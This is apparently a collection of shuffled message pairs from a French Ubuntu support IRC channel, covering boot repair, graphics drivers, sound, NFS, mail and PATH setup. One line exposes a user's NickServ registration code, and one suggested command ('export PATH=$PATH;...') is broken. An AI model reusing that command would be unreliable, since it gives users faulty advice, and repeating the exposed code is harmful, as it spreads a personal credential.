je download l'iso en attendant	c'est quoi ton pb
si je file un boot-info quelqu'un peut m'aider ?	nein
chaud xD	Je suis à 1 mbps :(
Je suis à 1 mbps :(	outch
Par ce Microsoft ^^	j'en est pas :( j'ai fait par usb quand j'ai installer windows 8
why ?	Normalement en bootant sur un dvd d'install, tu peux repair le boot en deux clics
putain j'arrive pas a reboot sur windows :(	T'as essayé de forcer en ligne de co ?
T'as essayé de forcer en ligne de co ?	pas reussi encore de demarrer, j'ai tanter un boot repair la je vais tester de faire une install de grub
pas reussi encore de demarrer, j'ai tanter un boot repair la je vais tester de faire une install de grub	Je te le déconseille vivement, mieux vaut utiliser le MBR de base
nagios :D	aucune idée juste eu une fenêtre bad connectionn
J'ai testé Munin pendant un moment mais je cherche une solution avec une interface conviviale	ta planté ? :D
En ce moment je cherche une solution open source de monitoring pour mes serveurs, je test Prometheus mais je voulais savoir ce que vous utilisez à titre de comparaison ?	moi j'utilise munin
c'est faisable de viré le tout?	oui
Merci	sudo apt-get autoremove --purge krename
tuboil > As-tu des choses dans ce fichier ~/.xsession-errors ?	je vais regarder, je reviendrais pour la suite, merci encore :-)
De quelle image parles tu ?	on est d'accord F2
oui, mais j'ai mon image qui se lance bien	tu appuies bien sur la touche F2 pour accéder au bios lors du boot, in est d'accord?
(mais pas par moi)	dans la doc on peut lire "protocols supported => Legacy Bios and EFI architectures".
Et dans le menu boot, rien d'intéressant (éventuellement dans un sous menu) ?	ce qui me fait alluciner c'est qu'Ubuntu a déjà été installé dessus !
ah zut, ben c'est moi qui suit désolé.	non
https://m.youtube.com/watch?v=bVYastxBFqo c'est celui là ton bios ?	je n'ai pas le menu avancé
(dans le menu boot)	je suis désolé, mais je n'ai vraiment pas l'option de visible
"uefi boot support" t'as pas ça dans ton bios ?	non, il semble être UEFI pas plus
Si la fonctionnalité existe tu ne devrais pas la rater.	je me doute, mais là rien trouvé de la sorte
Tu dois probablement avoir une option pour basculer en bios legacy.	genre appuis de touches ou activation d'options pour faire apparaître autre chose, mais rien pour le moment
pour preuve dans les spec du micrologiciel v1.01 (j'en suis à la v1.22), il y a écrit : Legacy BIOS and EFI architectures	alors regarde dans les menus de ton bios.
alors regarde dans les menus de ton bios.	je cherche un truc caché du coup
souvent dans les bios tu peux passer en bios/legacy	c'est bien ça le problème
résulat => pas de changement dans le Bios/efi ni au lancement de la clé...	ton os boote bien sur ton cd ?
vraiment, essayes d'aller dans une réunion libre ou tu trouveras des gourous	merci en tout cas !
je vais pas te faire perdre ton temps plus longtemps	non pas de temps perdu
et legacy boot ?	j'ai bien cherché, même en activant les mots de passe superviseur, rien à ce sujet
c'est quoi comme matériel que tu as ?	j'ai tenté d'avoir des infos de celui qui a réussi à faire l'opération au moins la première, incapable de se souvenir d'une procédure complexe...
sinon il y a pas mal de rassemblements Linux / GUL toussa je pense que tu peux trouver de l'aide par ce biai également	j'ai fait jouer mon réseau et pour le moment ça n'a rien donné
puis je suis pas assez acharné ^^	la doc du PC ou du Firmware ?
mais je pense que c'est faisable, faut s'acharner et se taper la doc	non, mais peut-être que tu as des infos en plus
justement, tu dois pouvoir désactiver ces trucs là normalemetn	c'est le normalement qui me gène
bon courage	oui en effet, surtout quand le paramétrage du BIOS/EFI est limité
Bonojur :) Quelle et la commande sous windows pour savoir si j'ai bien mon windows en MBR et non en Winload.efi ?	trompé de chan ?
surtout que contrairement à une époque où tout changeait beaucoup niveau environnement utilisateur entre 2 versions, actuellement tout est plutôt fixe	LTS, c'est pas tous les 2 ans plutôt ? :)
LTS, c'est pas tous les 2 ans plutôt ? :)	si, je ne sais pas d'où m'est venu ce rabotage :p
oui c'est exactement ça Zic	si tout fonctionne bien et qu'il n'y a pas de feature qui t'intéressent en version supérieure, non
apres l'installation du pilote nouveau, au lancement de steam j'ai : libGL error: unable to load driver: nouveau_dri.so	essaie de lancer en terminal : LD_PRELOAD='/usr/$LIB/libstdc++.so.6' DISPLAY=:0 steam
ben ecoutes les depot sont archives.ubuntu.com	c'est un mélange de dépôts, il n'y a pas que ceux d'Ubuntu
... pour une nana ? assurement !	doit en savoir peut-être plus
si c'est possible de l'avoir et que steam marche aussi ca me va	pour mes petites connaissances
si possible je preferais nouveau	donc je n'ai pas réussi à te convaincre pour rester sur Nouveau ^^
avec nouveau steam ne se lancait pas	ok, le besoin est clair, merci !
je pouvais ensuite reinstaller nvidia	besoin absolument des pilotes nvidia si Nouveau fonctionnait bien ?
non officiel	oui en effet
merci d'avance	tu as essayé ?
Sur l'etiquette j'ai Win7 Pro OA et aucun disque recovery lister dans diskpart	on peut voir ton partitionnement ? peut être que ça t'echappe de ton côté, ça arrive
ben non car sino tu perd tya licence mrromeo	c'est un prerequis de preparer sa question avant de l'exposer :)
oui invite de commande ouverte	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
Je veut mon pc en dual boot Win 7 et un Linux de Noob mais je suis inquiet sur les probléme risqué	je veux vérifier si ton windows 7 actuel est en EFI
j'ai voule installer gglrx et depuis mon affichege déconne il est lent. j'ai remove et purge cette install puis désinsitaller réinstaller les pilotes libres mais ça va pas mieux ... qui à une idée ?	cat .bash_history dans un pastebin, qu'on voit ce que tu as vraiment effectué
Merci beaver, je vais essayer de contacter les dev du projet ! C'est étrange tout de même puisque le projet à été présenté à la RMLL 2013, il devrait fonctionner	toi même, avec le niveau que tu as, tu vois qu'il fait appel au mauvais nom de package, et qu'au pire il chercherait à installer un package indispensable et donc installé par défaut sous ta ubuntu
tu peux donc héberger une serveur SSH, un serveur FTP… et utiliser les applicatifs standard	je dois m'absenter. Merci pour tes réponses et à bientôt sur ce canal.
bonjour, je souhaite faire communiquer deux pc sous ubuntu et qui partagent la même livebox, quelqu'un peut-il m'aider ? Merci.	faire communiquer quoi, des fichiers ?
quelqu'un à déjà eu ça ?	encore là?
ça fait que dalle	USB mort
je pourrais récupérer des données si je fais "sudo dd if=/dev/sdb of=/home/youruser/copy-of-sdb.raw" ?	fdisk -l /dev/sdb
les DD sont plus fiables ?	oh oui
 /msg NickServ VERIFY REGISTER youbaddi corxtmiscoqn	tout le monde a vu ton mot de passe
apt-get	peux tu faire echo $PATH
(de nos jours ça va, la plupart des logiciels se mettent dans /usr/local/bin, mais quelques-uns insistent et se mettent dans /usr/bin)	ou dans opt
Voilà	ok fait donc un cp de ton binaire dans /usr/local/bin
Hum à mon avis si je change le binaire de place il va plus pouvoir s'executer tranquille :s	c'est quoi ton soft qui nécéssite tant d'attention ?
c'est quoi ton soft qui nécéssite tant d'attention ?	https://soc-extras.lip6.fr/en/alliance-abstract-en/
https://soc-extras.lip6.fr/en/alliance-abstract-en/	ca se base sur des libs de ta distri
ca se base sur des libs de ta distri	Oui libs que j'ai installé à la main
Oui libs que j'ai installé à la main	installé à la main ?
tu pourrais mettre "." dans ton PATH, mais c'est un risque de sécurité	c'est surtout "débile" :)
pour autant que ton logiciel ne porte pas le même nom que un déja présent dans PATH	D'acc et comment je fais ça lol
D'acc et comment je fais ça lol	export PATH=$PATH;/mon/nouveau/chemin/
Genre comme ls, t'as pas besoin de faire ./CheminDeLs/ls pour l'utiliser	tu ajoutes le dossier dans ta variable PATH
Genre ls on peut l'utiliser de partout ben je veux faire pareil avec un de mes soft	à moins de tout lier statiquement (ou de bundler les .so), non
houps la ce n'est pas moi qui vais pouvoir t'aider sorry	quand tu as unmount ta swap, tu l'as fait via un liveCD?
bon écoute je copie tout qu'on s'est dit	et essaye ça : http://askubuntu.com/questions/620947/how-do-i-reset-my-unity-configuration-on-15-04
il est fort probable qu'une mauvaise manip de raccourci clavier soit à l'origineµ. Mais cela devait être par mégarde donc , je ne sais laquelle de mes mal adresses. En tout cas , je ne cherche pas à aller plus loin qu'un usage bureautique et internaute sur ma machine habituellement	as tu rebooté tout simplement ?
je ne retrouve plus dans mon poste de travail ni barre de taches, ni applications préalablement installées. je ne vois que le curseur de ma souris et seuls quelques raccourcis clavier fonctionnent. Que faire?	quel environement ? unity ?
vérifie aussi /var/mail/<tonuser> si tu as pas reçu un "non delivery"	Merci en tous cas !
Merci en tous cas !	de nada, oublie pas la reverse si c'est pas déjà fait (certain SMTP aime pas quand ça correspond pas et classe en SPAM)
Il y a peut cette commande sufisait pour envoyer un mail dans un script ou directement en CLI	après en fonction du domaine vers lequel tu envoies il y a peut-être besoin de configurer d'autre chose (la reverse DNS qui correspond au mailname par exemple)
après en fonction du domaine vers lequel tu envoies il y a peut-être besoin de configurer d'autre chose (la reverse DNS qui correspond au mailname par exemple)	Etrangement les logs sont vides
Etrangement les logs sont vides	ensuite "sudo tail -f /var/log/mail.log" et tu relances ta commande
ensuite "sudo tail -f /var/log/mail.log" et tu relances ta commande	le mail est arrivé direct --' Pourquoi faire simple quand on peut faire compliqué.
Petite question, je vient d'installer fraîchement un Debian 8 (je sais qu'on est sur l'iRC ubuntu mais le principe est le même) et lorsque je fais un bête echo "toto" | mail -s "tata" toto@tata.fr rien ne se passe le mail n'arrive pas.	ca va te proposer de choisir un profile, tu prends "Internet site" et tu entres un mailname valide
ca va te proposer de choisir un profile, tu prends "Internet site" et tu entres un mailname valide	Pour le nom j'ai mis le FQDN auquel le serveur correspond
Ave !	moi la première chose que je fais déjà c'est installer postfix (qui va virer automatiquement le exim par défaut)
moi la première chose que je fais déjà c'est installer postfix (qui va virer automatiquement le exim par défaut)	J'avais déjà postfix et j'ai essayé des trucs avec ssmtp et d'autres packets, comme c'est une vm de test je vais la flash à 0 ce sera plus simple
je sais pas ce que c'est	logiquement oui
de ubuntu.fr	vois tu un ii
http://paste.ubuntu-fr-secours.org/src-152912	sudo chown pop2012:pop2012 ~/.bash_history
voilà	ok. ls -la ~ maintenant ?
http://paste.ubuntu-fr-secours.org/src-152910	il te demande de pastebin le résultat de la commande mount
!paste	!!!
Screen 0: minimum 320 x 200, current 640 x 480, maximum 8192 x 8192 LVDS1 connected 640x480+0+0 (normal left inverted right x axis y axis) 345mm x 194mm    640x480        59.9*  VGA1 disconnected (normal left inverted right x axis y axis) HDMI1 disconnected (normal left inverted right x axis y axis) DP1 disconnected (normal left inverted right x axis y axis)	*
tu es sur que cest toshiba comment tu peux le savoir ?	j'ai fait une recherche avec l'id usb
aucune idee piti :/	"history" fait bien le boulot
ah oui, comme entrée en matiere, ça présage rien de bon	c'est pas un uuoc ?
http://paste.ubuntu-fr-secours.org/src-152908	ça semble être 0480:a00a
non je crois pas	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
swap je peux je ne suis pas assise dessus ?	si, la swap tu peux démonter quand t'es en session live.
yeah	est-ce que t'as essayé de démonter sda5, sda6, et la swap ?
Merci d'avance	essayes ça https://askubuntu.com/questions/225085/how-to-move-window-buttons-from-left-to-right-side-of-title-bar-in-gnome-classic
sudo ls -a /root/.local/share/Trash/files	qu'est ce qui t'a mis la puce à l'oreille ?
merci des quelque reponce :) je vais allé miamiam  donc bon courage avec votre probléme et bonne féte  quel vous soi douce	bon appétit et bonnes fetes à toi aussi :)
t'as du faire un équivalent de gksudo nautilus ou que sais je :/	ton truc a l'air de marcher pour l'instant ...
ma corbeille est vide	et dans la console ça s'affiche ?
je vais tester je reviens si ça ne va pas mieux	même sur 10
à toi de voir, on en voit pas plus ici	.  ..  share
si c'est l'adresse mac de ta box, on voit que le choix il emane de lui dans l'erreur	je te confirme c'est mon modem
je te confirme c'est mon modem	donc surement un probleme de configuration
je tape juste ls -a ?	sudo ls -a /root/.local
oui je pense car c'est pas la meme que ma clé wifi en tous cas	si t'as un moyen de vérifier, je t'en prie
http://paste.ubuntu-fr-secours.org/src-152896	donc pour être un plus précis, c'est dans /root/.local ls -a pour voir
ben rien mise à part les logiciels sont pas les meme :-)	c'est tellement vague : l'adresse mac qu'on voit 20:e5:2a:24:31:8f c'est ta box ?
bein d'apres les logs, tu debranches et ensuite y'a une deauth	je t'ai envoyé ce que ça me dit
je t'ai envoyé ce que ça me dit	aide toi un peu :), je te demande de taper la même commande mais sans "*", depuis le début j'ai spécifié de le faire avec, si tu faisais sans … tu faisais pas ce que je demandé ?
merci	l'idée c'est de faire ça quand internet se coupe, c'est le cas ?
c'est quoi url pour le copier coller ?	l'idée c'est de faire ça sans quand internet se coupe, c'est le cas ?
ok je tente ce truc	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
si je rajoute " * ", ça me donne une ligne	tu retapes la même commande mais sans "*", désolé pour l'erreur :S
et je suis en mode root	bein je sais pas … outre de te redemander de revérifier la commande tapée, je vois pas pourquoi il te listerait pas les dossiers/fichiers cachés
elle fonctionne chez moi	et je suis obligé de déconnecter ma clé et de la reconnecter ...
et je suis obligé de déconnecter ma clé et de la reconnecter ...	tu devrais ouvrir un terminal avec cette commande tailf /var/log/kern.log et quand tu une déconnexion, tu copies/colles le résultat sur un site de pastebin
bein, comment dire, c'est comme sudo reboot et avoir une mise en veille à la place	Je peux me connecter avec ma clé wifi et à un moment on ne sait pas pourquoi j'ai plus d'internet. Je suis toujours connecté sur ma box mais plus rien ...
Sys. de fichiers Taille Utilisé Dispo Uti% Monté sur udev               2,0G    4,0K  2,0G   1% /dev tmpfs              394M    1,3M  393M   1% /run /dev/sda1          290G    287G     0 100% / none               4,0K       0  4,0K   0% /sys/fs/cgroup none               5,0M       0  5,0M   0% /run/lock none               2,0G    171M  1,8G   9% /run/shm none               100M    8,0K  100M   1% /run/user overflow           1	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
en pv peut-être??	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
12/22/15 16:55:53 < *vamps> Tieutieu: c'est à dire ?	mon ordi me dit que mon disque est saturé, qu'il est plein alors que c'est faux
#ubuntu-fr-offtopic	c'est à dire ?
oui je pense beaver	tu le pense moins maintenant ?
12/22/15 14:00:44 < -doutix89> oué mes ses une version beaver	pas mal, mais pas suffisant, je dois être capable de les afficher pour en faire une capture d'écran (trop long à expliquer le pourquoi)
pas mal, mais pas suffisant, je dois être capable de les afficher pour en faire une capture d'écran (trop long à expliquer le pourquoi)	ah ok
oué j'ai la version 43.0 beaver	donc ?
ancienne	tu utilises quelle version de Ubuntu ?
?_?	http://bernaerts.dyndns.org/linux/74-ubuntu/245-ubuntu-precise-android-adb-fastboot-qtadb#h4-1-prerequisite-on-phone-side mais je vais voir ce que ça donne sans
!wiki ubuntu softare	Error: I tried to send you an empty message.
je voudrais installé ça beaver  https://www.mozilla.org/fr/firefox/new/	pas besoin d'utiliser un package tiers pour ça
https://chombium.wordpress.com/2012/09/30/android-how-to-backup-contacts-and-sms-messages/ c'est mieux mysterty (c'est offtopic je pense)	je te remercie à la place de mysterty si ça peut te faire chaud au coeur
"conserver dans la barre"	oui mais moi je n'utilise pas unity
j'ai un fichier .desktop fonctionnel présent dans /usr/share/applications/	le plus simple, tu lances l'appli, il met le lanceur, tu clic dessus pour lui dire de le garder dans la barre
Oui vamps  => http://paste.ubuntu-fr-secours.org/src-152881	installes le paquet "pavucontrol" si c'est pas déjà fait et lance le
si tu fais "ps aux | grep -i pulseaudio" tu as des choses ?	 J'ai installer ubuntu minimal, j'ai donc tout installer alsa etc, sauf que dans alsamixer, et bien en premier c'est la carte  HDMI et pas ma carte son du pc
a avoir du son	 Désolé, je regardais au niveau de alsa conf, et bien disons que j'avais justement ce problème sous Archlinux, j'ai changé un truc dans la configuration pour remplacé l'ordre justement et j'ai eu du son, sauf que là je sais plus comment j'avais fais ^^'
 Désolé, je regardais au niveau de alsa conf, et bien disons que j'avais justement ce problème sous Archlinux, j'ai changé un truc dans la configuration pour remplacé l'ordre justement et j'ai eu du son, sauf que là je sais plus comment j'avais fais ^^'	ah oui, tu parles de la carte par défaut
ah oui, tu parles de la carte par défaut	 Oui, c'est la sortie HDMI qui est en première du coup je n'ai pas de son :/
 Oui, c'est la sortie HDMI qui est en première du coup je n'ai pas de son :/	il me semble que ubuntu utilises pulseaudio
de quoi vous parlez?*	de alsa
wat?	quoi ?
Re, je rencontre un léger problème, Alsa à choisit ma carte son HDMI par défaut et pas celle du pc, du coup je n'ai pas de son, savez-vous comment puis-je faire ? :)	tu utilises pulseaudio ?
Chez moi	As tu déjà vérifie tes informations smarts?
Parce que là j'ai ni serveur X ni réseau	pardon?
J'ai modifier initrd pour qu'il soit compatible avec le réseau.	Tu sais ce qui s'occupe du démarrage ?
 loading a base X session.	Je viens de voir que je n'ai même plus de réseau
WTF le truc	et tu l'as pas réinstallé du coup ?
j'ai déjà eu un problème de config du "greeter" lightdm que j'avais résolut comme ça	Ben sachant que startx me dit que xinit n'est pas installé
Vu dans /var/log/lightdm/x-0.log	tu connais apt-file ?
Mais je suis en vacances en France là, j'étudie en Angleterre en fait, et flemme de massacrer du temps à config une distro	tu peux toujours regarder dans /var/log/dpkg.log et /var/log/apt/* si tu veux essayer de voir pourquoi ce paquet aurait été désinstallé
tu peux toujours regarder dans /var/log/dpkg.log et /var/log/apt/* si tu veux essayer de voir pourquoi ce paquet aurait été désinstallé	Apparemment j'ai un problème avec libxshmfense.so.1 qui n'existe pas ! (O.O)
ou xinit tout simplement :D	Ok, je vais checker
Fu (T.T)	t'as pas un paquet xorg-xinit ou un truc du genre ? (j'ai aps ubuntu)
t'as pas un paquet xorg-xinit ou un truc du genre ? (j'ai aps ubuntu)	"j'ai pas ubuntu" // Je te comprensd
graphique	Le pilote libre
Le pilote libre	t'as ça suiet à une mise à jour tu as dit ?
Es ce que le noyau 3.13.0-24 est spécial? J'arrive pas le lancer!	Aussi, startx refuse de se lancer, il dit qu'il faut installer xinit ! (O.O)
Mais ce foutu Xorg veut pas se lancer	t'as quoi comme pilote ?
J'avoue ne pas savoir quoi faire là	en lecture seul, cela dénote un probléme matériel!
en lecture seul, cela dénote un probléme matériel!	Bon, ça s'allume bien
robertt Y a-til possibilité d'effectuer automatiquement la mise à jour vers le nouveau noyau LTS Xenial en Aout 2016 (via un métapaquet par exemple), ou faudra t-il explicitement installé ce nouveau noyau ?	quand tu fais la mise a jour de LTS en LTS, tout es mis à jours noyau compris!
quand tu fais la mise a jour de LTS en LTS, tout es mis à jours noyau compris!	oui mais justement sans faire la mise à jour LTS en LTS, en restant en Ubuntu 14.04
oui mais justement sans faire la mise à jour LTS en LTS, en restant en Ubuntu 14.04	Rien ne t'empêche d'installer les noyaus et tester le boot, tu verra bien!
Rien ne t'empêche d'installer les noyaus et tester le boot, tu verra bien!	prendre en charge du matériel récent, c'est le but du "LTS Enablement Stacks" de backporter les noyaux des versions suivantes dans la LTS en cours
prendre en charge du matériel récent, c'est le but du "LTS Enablement Stacks" de backporter les noyaux des versions suivantes dans la LTS en cours	pourquoi ne pas passer à la 16.04 directement?
pourquoi ne pas passer à la 16.04 directement?	parce que ça demande du temps de migrer un parc en 16.04, et ca se fera pas 2 mois après la sortie du 16.04 ou il y aura certainement plein de bugs à corriger
parce que ça demande du temps de migrer un parc en 16.04, et ca se fera pas 2 mois après la sortie du 16.04 ou il y aura certainement plein de bugs à corriger	dans ce cas, pourquoi vouloir mettre a jours les noyau au risque créer plein de probléme?
dans ce cas, pourquoi vouloir mettre a jours les noyau au risque créer plein de probléme?	pour suppporter du matériel récent (qui n'a bien sur pas été testé avant d'ere mis à disposition)
pour suppporter du matériel récent (qui n'a bien sur pas été testé avant d'ere mis à disposition)	et pourquoi mogrer un parc informatique? les LTS ont un durée de vie de 5 ans.
et pourquoi mogrer un parc informatique? les LTS ont un durée de vie de 5 ans.	justement le but est de rester en 14.04 pour le moment et pas de migrer en 16.04, mais bien que ce soir maintenu 5 ans, il peut y avoir un besoin de version plus récentes
justement le but est de rester en 14.04 pour le moment et pas de migrer en 16.04, mais bien que ce soir maintenu 5 ans, il peut y avoir un besoin de version plus récentes	tu migre les machines ayant besoin du nouveau noyau et tu laisse les autres vivre!
tu migre les machines ayant besoin du nouveau noyau et tu laisse les autres vivre!	oui tout à fait, c'est le but, mais j'aimerai savoir si en aourt 2016, je vais me retrouver avec des machines avec un noyau non maintenu, qu'il faudra remigrer ...
j'ai une question conernant le "LTS Enablement Stacks" : je vois que sur Ubuntu 14.04, les noyaux LTS Utopic, Vivid et Willy sont maintenus jusqu'en Aout 2016 (cf. https://wiki.ubuntu.com/Kernel/Support?action=AttachFile&do=get&target=14.04.x+Ubuntu+Kernel+Support+Schedule.png)	pourquoi veux tu mettre un noyau 16;04 sur un 14.04?
pourquoi veux tu mettre un noyau 16;04 sur un 14.04?	je suis d'accord que ça risque de créer des problèmes
Bonjour, j'ai installer ubuntu minimal, mais je n'arrive pas à mettre le wifi je voudrait disposer d'un gestionnaire wifi automatique comme pour xubuntu comment puis-je faire ? Merci :) (Environnement xfce)	tu peux utiliser celle du network manager, nm-applet ou xfce4-wavelan-plugin
Je vais vous quitter j'ai de la visite .Je reviendrai voir plus tard . Merci tout de même et bonne journée.	salut
je pense que j'ai vraiment du mal à m'exprimer et à comprendre et je vais devoir faire appel à mon ami qui viendra faire la manip sur l'ordi directement... je reessairai quand je saurais mieux de quoi je parle.	dans un terminal -> sudo fdisk -l
bah la en fait j'attends de l'aide si c'est possible... désolée mais je parle peu le langage informatique plus le langage courant en humains ...Je vais faire des efforts ...j'espère que les participants contributeurs de ce forum en feront aussi...	de l'aide sur quoi?
pour moi un forum est un lieu de discussion alors ca collait	ici, c'est simple, si tu as une question et tu attend les réponses! Si des gens poses de questions, alors tu répond si tu sais!
bou h je suis débutantye je vais apprendre le vocabulaire	si tu prend la définition latine, lieu de rencontre, cela peut coller. Général un Forum en informatique, c'est un lieu où sont posté des questions: https://forum.ubuntu-fr.org/
je dois etre trop matinaale non?	là, c'est un canal, pas un forum!
je cherche un client openvpn en mode graphique svp	le réseau le gére directement!
bon retourne ce résultat (tout simplement) ls ~/.local/share/Trash	evilnewbie
bah c'est ubuntu normal la 14.04	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
bonjour je voudrais savoir pourquoi ubuntu refuse systématiquement de mettre mes fichiers a la poubelle	mais encore ?, ça dit quoi quand tu déplaces ton fichier dans la poubelle ?
mais encore ?, ça dit quoi quand tu déplaces ton fichier dans la poubelle ?	evilnewbie
c'est un PC portable ou fixe, Anooother ?	 C'est un PC portable
Problème résolu merci davlefou	Bonne chose de faite!
https://doc.ubuntu-fr.org/tutoriel/comment_restaurer_grub	Merci je vais regarder ça :)
Bonjour	Bonjour,
Bonjour,	Tu peux m'aider à faire booter linux sur un disque dur externe ?
du coup tu t'es restreint soit des droits, soit ... autre chose	 Désolé pour le retard, et oui, j'utilise bien la bonne sortie, j'ai même essayé plusieus, c'est pareil :)
quand mon systéme se lance, il se bloque, voici mon dmesg: http://dpaste.com/2CDXXSM	tu l'as déjà dit il y a 10 minutes
McPeter Oui j'ai essayé un MP3 (Keen'V) :x Et le problème est le même	et dans gestionnaire de son tu utilises bien la bonne sortie ?
j'ai essayé de suivre les tutos ! lol... alors je ne vois pas.. qq'un m'a conseillé sshfs... tu connais ?	non mais non
J'utilise VLC	tu as essayé d'autres média ?
quand je veux installer "nfs-kernel-server" il me répond 'Aucun paquet ne va être installé"...	il est donc installé ? (le dpkg -l nfs-kernel-server te l'aurait renseigné)
C'est embêtant quand on écoute quelque chose parce que 'fin voilà le son quoi  :')	tu as installé les restrited ?
Quelqu'un à t-il la solution à mon problème ? (:	on l'a pas en entier: "…quoi ^^' je vou"
je suis sous... Debiazn Jessie (pardon) mais ça ne devrait pas poser de pb, si ???	c'est un salon ubuntu, t'as un salon debian juste à coté
"commande introuvable"	dpkg -l nfs-kernel-server répond quoi ?
McPeter : ta commande est refusée...	tu es sous quoi ?
j'avias fait : /etc/init.d/nfs-kernel-server reload	gni ??
je l'avais fait... lol	et ça répond [ok] ?
il me répond : "Export liste for serveur:" et rien derrière	refais voir ta ligne de /etc/export
sans guillemets	faudrait que ça soit exporté :p)
pardon McPeter tu me proposes d'ajouter "040" ?	showmount -e te liste quelque chose alors ?
oui et les "" aussi	tu vois
enfin, sur le serveur: showmount -e liste bien ton export ?	ça marche très bien avec des espaces :)
http://paste.ubuntu-fr-secours.org/src-152877	essaye avec http://pastebin.com/cP6Zg8VM
je n'arrive pas à monter un réseau basique nfs... j'ai le retour suivant : "access denied by server while mounting..."	sur le serveur, tu autorises le client à faire le montage ?
merci en tous cas pour ces recherches robertt	il n'y a que neuf personne affecté par ce bug, peut-être qu'il apparait uniquement dans des configurations particulières
le menu kde est une fonction de base !	"Since no fix was found, I deleted my ~/.kde folder and restarted. The regenerated .kde didn't have this issue, and after a few minutes of setting up my configuration I was good to go." => https://forum.kde.org/viewtopic.php?f=67&t=124407
bonsoir robertt. penses-tu pouvoir m'aider avec un pastebin du resultat ?	je pense pas non, j'utilise pas du tout kde
qui me dit que lorsque je serai là-bas et que tout le monde sera prêt, le problème va se manifester ...	tente peut être un 'dpkg -l *kde*' pour voir les paquets kde installés, puis un 'dpkg -L [paquet] | grep /usr/bin' pour voir les fichiers installés parce s paquets dans /usr/bin
c'est pas facile de trouver de l'aide un samedi soir... j'ai essayé sur les chans en anglais, rien d'utile ne sort de là	quel est ton niveau de maitrise linux?
Eteindre, redemarrer, etc... ?	cela t'arrive souvent?
"parfois", le bouton éteindre (et ses frères) ne semblent rien faire du tout	as tu été voir les logs?
Ok d'accord, donc j'en fait une, merci beaucoup ! :D	patiente pour avoir une confirmation :)
Ok ! merci beaucoup pour l’éclairement	donc oui, c'est normal, ya pas de soucis, par conrte normalement ca doit fonctionner de la meme façon que ce soit sur ubuntu, lubuntu, kubuntu, xubuntu ... vu qur c'est le même système avec juste un envrinnement de bureau différent
logiquement non pas de problème	merci *
merci *	"The new naming convention assigns names to network interfaces based on their physical location, whether embedded or in PCI slots." => https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Deployment_Guide/appe-Consistent_Network_Device_Naming.html
"The new naming convention assigns names to network interfaces based on their physical location, whether embedded or in PCI slots." => https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Deployment_Guide/appe-Consistent_Network_Device_Naming.html	merci :)
Pour ton "pb" de nom d'interface	salut !
Mais c'est /kvm qu'il falait sortir :p	si tu decouvres kvm/qemu, verifie que tu as une machine avec du vt-x, et installe virt-manager
!wiki kvm	http://doc.ubuntu-fr.org/testdrive
?	oui : ">"
</coup_de_gueule>	il arrive souvent que le copain google index mieux les blogs que la doc officielle :)
Autre question, rien à voir... j'essaye d'utiliser "Timeshift" qui me sauvegarderais mon systeme... J'essaye de sauvegarder sur un HD extern... et je me retrouve avec 5go de pris sur ma partition / ...	rapport àça : <bleurg> j'ai fais la manip decrite ici : http://community.linuxmint.com/tutorial/view/1609
rien que .mozilla	clair …
ssd c'est bien mais pas les moyens pour moi... la je fait du bateau avec de l'usb :P	tout ça pour dire que oui ça marche
c'est exactement ce qui est fait.	 que tu ais tes données sur un disque ntfs, soit, mais dans le repertoire perso, il n'y a pas que des données
zut	avec bind ça marche ?? bleurg tu peux faire un test ?
avec bind ça marche ?? bleurg tu peux faire un test ?	j'ai un / en ssd
ssh va etre content	:)
Bonjour :) Gros problème avec driver nvidia pour carte Quadro FX 880M: le pc s'éteind brutalement à peine la vue lightdm s'affiche. Quelqu'un a déjà eu le problème?	ton alimentation est-elle suffisante ?
Koule, merci	plutôt bien documenté : https://help.gnome.org/users/gnome-power-manager/stable/
J'ai installé Ubuntu 15.10 avec Gnome Shell sur un Lenovo Thinkpad S440, et l'autonomie est assez catastrophique par rapport à ce que j'avais sous Windows 8.1... De 4h-4H30 je suis passé à 1h30 (écran avec la luminosité au minimum, Bluetooth désactivé, Wifi activé). Est ce que l'application TLP est toujours d'actualité ? Est ce que des astuces simples peuvent me permettre d'améliorer mon autonomie ?	as tu installé gnome-power-magement ? je sais pas s'il est toujours utile
comment je peux régler ça alors?	https://doc.ubuntu-fr.org/formats_non-libres
quand je mets une video, ça marque "cette vidéo n'a pas pu charger, soit parce que le serveur ou le réseau a échoué parce que le format n'est pas reconnu	tu as un soucis de codec alors
profite, ca va pas durer ;)	ils viennent de sortir la version 20 là
de toute facon, adobe a arreté flash aussi ;)	je l'utilise tous les jours sans soucis
(plus de java non, etc .. car plus de support NPAPI)	bah si sur chromium 47 ya flash 17
C'EST QUOI ÇA?	j'ai aucun soucis moi
pepperflashnonfree Jeff000000	pas à jour
comment dois-je procéder avec le lien que vous m'avez envoyé?	mais je vois pas comment ça peut te bloquer
je vous en remercie d'avance	pour avoir A_daube flash à jour, installe chromium
y a t il quelqu un pour m'aider ?	pose simplement ta/tes question(s)
si je lui dis de lancer sudo apt-get dist-upgrade avant meme de faire le test, ça risque d'aggraver le probleme?	le risque est faible mais il existe. quelle fasse une sauvegarde
est ce qu'il existe une procedure qui pourrait s'appliquer a ces deux cartes?	quelle version d'ubuntu ?
quelle serait la solution?	comprendre le problème et le résoudre. Il s'agit souvent de choisir entre le pilote propriétaire et le pilote libre
comment annuler cette mise a jour pour retrouver un affichage normal? merci	serait plus futé de comprendre le problème que de revenir à une version qui n'aura de cesse de vouloir se mettre à jour
ça dit toujours pas si tu le vois Dae_ … ça fait quoi depuis 22:15	définir GRUB_timeout à une valeur non nulle si GRUB_hidden_timeout est définie et n'est plus possible
si c'est le prerequis, tu vas pas faire des miracles :P	définir GRUB_timeout à une valeur non nulle si GRUB_hidden_timeout est définie et n'est plus possible
faut en mettre 8 minimum maintenant	tu connais un jeu comme fallout 4 avec un support natif linux ? avec le même niveau côté graphisme etc ?
